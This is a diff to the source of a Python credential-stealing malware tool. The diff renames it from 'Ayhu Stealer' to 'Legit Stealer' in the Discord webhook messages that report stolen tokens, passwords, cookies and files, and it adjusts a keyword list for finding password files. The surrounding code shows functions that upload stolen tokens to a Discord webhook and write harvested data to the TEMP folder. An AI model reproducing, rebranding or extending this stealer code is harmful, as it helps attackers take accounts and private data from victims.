@@ -274,7 +274,7 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "@Ayhu Stealer",
+                "text": "@Legit Stealer",
                 "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"
                 },
             "thumbnail": {
@@ -283,7 +283,7 @@ def uploadToken(token, path):
             }
         ],
         "avatar_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg",
-        "username": "Ayhu Stealer",
+        "username": "Legit Stealer",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -315,10 +315,10 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                "name": "Ayhu | File Stealer"
+                "name": "Legit | File Stealer"
             },
             "footer": {
-                "text": "@Ayhu Stealer",
+                "text": "@Legit Stealer",
                 "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"
             }
             }
@@ -354,10 +354,10 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                "name": "Ayhu | Password Stealer"
+                "name": "Legit | Password Stealer"
             },
             "footer": {
-                "text": "@Ayhu Stealer",
+                "text": "@Legit Stealer",
                 "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"
             }
             }
@@ -386,10 +386,10 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                "name": "Ayhu | Cookies Stealer"
+                "name": "Legit | Cookies Stealer"
             },
             "footer": {
-                "text": "@Ayhu Stealer",
+                "text": "@Legit Stealer",
                 "icon_url": "https://cdn.discordapp.com/attachments/970003785558683698/1031147917685309490/sa.jpg"
             }
             }
@@ -406,7 +406,7 @@ def upload(name, tk=''):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--AYHU STEALER BEST -->\n\n")
+        f.write(f"<--Legit STEALER BEST -->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -694,7 +694,7 @@ def Kiwi():
     ]
 
     key_wordsFiles = [
-        "passw",
+        "password",
         "mdp",
         "motdepasse",
         "mot_de_passe",
